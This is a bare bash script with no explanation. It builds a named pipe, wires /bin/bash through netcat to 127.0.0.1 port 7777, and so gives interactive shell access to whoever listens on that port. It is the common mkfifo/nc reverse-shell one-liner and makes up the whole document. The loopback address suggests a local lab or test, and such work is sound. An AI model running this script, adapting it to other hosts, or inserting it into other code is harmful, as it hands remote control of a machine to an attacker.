#!/bin/bash
mkfifo /tmp/f
/bin/bash 0</tmp/f | nc 127.0.0.1 7777 1>/tmp/f && rm /tmp/f

